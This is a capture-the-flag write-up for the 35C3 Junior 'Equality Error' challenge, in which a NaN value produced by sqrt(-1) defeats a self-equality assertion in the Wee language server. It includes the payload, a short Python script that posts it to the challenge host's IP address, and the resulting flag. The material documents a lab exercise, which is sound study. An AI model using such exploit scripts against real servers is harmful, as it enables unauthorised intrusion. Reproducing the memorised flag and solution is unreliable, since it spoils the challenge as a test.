# 35C3 Junior CTF â€“ Equality Error

* **Category:** Misc  
* **Points:** 88 (variable)

## Challenge

> At assert_equals(num: number), we've added an assert to make sure our VM
> properly handles equality. With only a few basic types, it's impossible to
> mess this one up, so the assertion has never been triggered. In case you do
> by accident, please report the output.

> Good coders should learn one new language every year.

> InfoSec folks are even used to learn one new language for every new problem

>  
> If you have not picked up a new challenge in 2018, you're in for a treat.

> We took the new and upcoming Wee programming language from paperbots.io. Big
> shout-out to Mario Zechner (@badlogicgames) at this point.

> Some cool Projects can be created in Wee, like: this, this and that.  
>  
> Since we already know Java, though, we ported the server (Server.java and
> Paperbots.java) to Python (WIP) and constantly add awesome functionality.
> Get the new open-sourced server at /pyserver/server.py.

> Anything unrelated to the new server is left unchanged from commit

> (mirrored up to this commit here).  
>  
> We even added new features to this better server, like server-side Wee
> evaluation!  
>  
> To make server-side Wee the language of the future, we already implemented
> awesome runtime functions. To make sure our VM is 100% safe and secure,
> there are also assertion functions in server-side Wee that you don't have to

## Solution

The *Wee* interpreter source code can be found here:
`http://35.207.189.79/weelang/weeterpreter.ts`.

The endpoint that can be used to run *Wee* code is the following.

```  
http://35.207.189.79/wee/run  
```

The assertion that must be exploited is the following.

```Typescript  
externals.addFunction(  
  "assert_equals",  
  [{name: "num", type: compiler.NumberType}], compiler.StringType,  
  false,  
  (num: number) => num === num  
      ? "EQUALITY WORKS" : flags.EQUALITY_ERROR  
)  
```

This is the behavior of `NaN`. To generate it, the square root of a negative
number can be calculated (i.e. the "constant" `NaN` is non defined in *Wee*
language).

The payload is the following.

```  
alert(assert_equals(sqrt(-1)))  
```

The following Python script can be used to send the payload.

```Python  
import requests  
import json

url = "http://35.207.189.79/wee/run"  
data_structure = """{{ "code": {} }}"""  
data_content = """alert(assert_equals(sqrt(-1)))"""

data_content_to_send = json.dumps(data_content)  
data_to_send = data_structure.format(data_content_to_send)  
print "[*] Payload: '{}'.".format(data_to_send)  
response = requests.post(url, data=data_to_send)  
print "[*] Response: '{}'.".format(response.text)  
```

The flag is the following.

```  
35C3_NANNAN_NANNAN_NANNAN_NANNAN_BATM4N  
```
